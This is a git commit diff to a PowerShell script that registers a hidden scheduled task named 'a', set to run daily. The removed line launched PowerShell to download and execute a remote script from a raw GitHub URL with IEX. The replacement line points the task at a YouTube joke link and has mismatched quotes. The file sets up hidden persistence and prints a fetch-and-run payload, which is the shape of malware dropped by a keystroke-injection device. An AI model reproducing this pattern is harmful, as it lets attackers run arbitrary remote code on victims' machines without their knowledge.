5cf32d60ae3e1427bb4e7361088731f3f86792e1
zotion-site <59572653+zotion-site@users.noreply.github.com>
2021-03-10 10:55:12 +0100

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,4 +1,4 @@
 $settings = New-ScheduledTaskSettingsSet -Hidden
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/command.ps1');"
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "https://youtu.be/dQw4w9WgXcQ'
 $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'a' -Settings $settings
